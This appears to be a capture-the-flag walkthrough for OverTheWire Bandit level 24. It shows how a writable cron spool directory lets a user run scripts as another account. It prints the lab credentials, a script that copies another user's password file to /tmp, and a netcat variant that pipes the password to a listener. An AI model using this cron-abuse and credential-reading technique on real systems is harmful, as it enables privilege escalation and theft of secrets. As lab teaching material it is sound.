# Level 24

## Objectives

1. SSH to `bandit23`
2. Find out what the cronjob is doing

### Objective 1

* Username: `bandit23`
* Password: `jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n`
* Port: `2220`  
* IP/Hostname: `bandit.labs.overthewire.org`

```sh
user@localhost:~$ ssh -p 2220 bandit23@bandit.labs.overthewire.org
```

> Success!

### Objective 2

Since we saw from a couple levels ago what other scripts were running under `/etc/cron.d`, we know that `/usr/bin/cronjob_bandit24.sh` is our next target.

```sh
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 ./$i
	rm -f ./$i
    fi
done
```

This seems like it's going to execute anything in the `/var/spool/bandit24` as long as it was not `.` or `..`, to avoid relative directory structure. 

Let's check to see if we can write to this directory.

```sh
bandit23@bandit:~$ stat /var/spool/bandit24/
  File: /var/spool/bandit24/
  Size: 1359872   	Blocks: 2664       IO Block: 4096   directory
Device: fb01h/64257d	Inode: 920097      Links: 29
Access: (0773/drwxrwx-wx)  Uid: (    0/    root)   Gid: (11024/bandit24)
Access: 2020-03-23 20:10:01.733275317 +0100
Modify: 2020-03-23 20:09:01.729319714 +0100
Change: 2020-03-23 20:09:01.729319714 +0100
 Birth: -
```

Since we can, we need to create a bash script to give us the password.

We also need to find a directory that both of us can read and write to.

`/tmp` looks like a good enough place. 

```sh
bandit23@bandit:~$ stat /tmp
  File: /tmp
  Size: 313204736 	Blocks: 611840     IO Block: 4096   directory
Device: fb03h/64259d	Inode: 2           Links: 1
Access: (3773/drwxrws-wt)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2020-03-22 20:50:51.715668098 +0100
Modify: 2020-03-23 20:37:20.932083465 +0100
Change: 2020-03-23 20:37:20.932083465 +0100
 Birth: -
```

The script is simply this:

```sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit_pass.txt
```

Use a text editor like `vim` or `nano` and paste that into it.

You'll then need to `chmod 777` to assure that `bandit24` will be able to execute it.

```
bandit23@bandit:~$ vim -i NONE /var/spool/bandit24/pw.sh
bandit23@bandit:~$ chmod 777 /var/spool/bandit24/pw.sh
```

Now wait a little bit and then you'll need to read from the file you just created.

```sh
bandit23@bandit:~$ cat /tmp/bandit_pass.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```


Alternative script:

You could also use `netcat` to send the password to yourself.

Create the `/var/spool/bandit24/pw.sh` script.

```sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 | netcat localhost 9001
```

```sh
bandit23@bandit:~$ chmod 777 /var/spool/bandit24/pw.sh
bandit23@bandit:~$ netcat -nvlp 9001
listening on [any] 9001 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 52118
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```